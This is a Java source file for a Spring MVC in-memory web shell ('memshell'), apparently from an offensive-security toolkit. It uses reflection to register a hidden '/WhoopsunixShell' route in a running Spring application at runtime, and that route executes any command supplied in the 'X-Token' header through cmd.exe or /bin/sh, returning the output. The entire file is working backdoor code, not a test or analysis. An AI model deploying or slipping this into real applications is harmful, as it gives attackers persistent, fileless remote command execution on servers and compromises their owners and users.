package com.example.springmemshell.memshell;

import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

/**
 * @author Whoopsunix
 * <p>
 * Version test
 * spring-boot-starter-web
 * [2.2.x, 2.7.x]
 */
public class SpringControllerMemShell {
    private static String PATTERN = "/WhoopsunixShell";
    private static String NAME = "Whoopsunix";
    private static String HEADER = "X-Token";

    public SpringControllerMemShell(String s) {
    }

    public SpringControllerMemShell() {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);

            // 是否存在路由
            AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class);
            Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
            method.setAccessible(true);
            Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping);
            Field field = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry").getDeclaredField("nameLookup");
            field.setAccessible(true);
            Map urlLookup = (Map) field.get(mappingRegistry);
            Iterator urlIterator = urlLookup.keySet().iterator();
            List<String> urls = new ArrayList();
            while (urlIterator.hasNext()) {
                String urlPath = (String) urlIterator.next();
                if (PATTERN.equals(urlPath)) {
                    return;
                }
            }

            Method exec = SpringControllerMemShell.class.getDeclaredMethod("exec");

            Field configField = mapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration)configField.get(mapping);
            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(new String[]{PATTERN}).options(config).build();

            // 避免循环
            SpringControllerMemShell springControllerMemShell = new SpringControllerMemShell(NAME);
            mapping.registerMapping(requestMappingInfo, springControllerMemShell, exec);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @ResponseBody
    public static void exec() {
        try {
            Class clazz = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Object object = clazz.getMethod("getRequestAttributes").invoke(null);
            clazz = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            Object request = clazz.getMethod("getRequest").invoke(object);
            Object response = clazz.getMethod("getResponse").invoke(object);
            java.lang.reflect.Method method = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader", String.class);
            String header = (String) method.invoke(request, HEADER);
            method = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
            Object writer = method.invoke(response);

            if (header != null && !header.isEmpty()) {
                String[] cmd = null;
                String os = System.getProperty("os.name").toLowerCase();
                if (os.contains("win")) {
                    cmd = new String[]{"cmd.exe", "/c", header};
                } else {
                    cmd = new String[]{"/bin/sh", "-c", header};
                }
                String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();

                writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, result);
                writer.getClass().getDeclaredMethod("flush").invoke(writer);
                writer.getClass().getDeclaredMethod("close").invoke(writer);
            }
        } catch (Exception e) {

        }
    }


}
